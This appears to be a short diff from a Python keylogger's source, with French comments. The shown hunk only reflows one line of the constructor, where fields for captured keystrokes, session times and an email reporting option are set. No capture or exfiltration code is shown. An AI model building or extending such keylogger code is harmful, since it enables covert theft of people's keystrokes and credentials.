@@ -33,7 +33,9 @@ class Keylogger:
         self.report_method = report_method  # Méthode de rapport : "email" ou "file"
         self.log = ""  # Stocke les frappes clavier capturées
         self.start_dt = datetime.now()  # Date de début de la session
-        self.end_dt = datetime.now() # Date de fin de la session (mise à jour à chaque rapport)
+        self.end_dt = (
+            datetime.now()
+        )  # Date de fin de la session (mise à jour à chaque rapport)
 
         # Paramètres pour l'envoi par email
         self.email = email
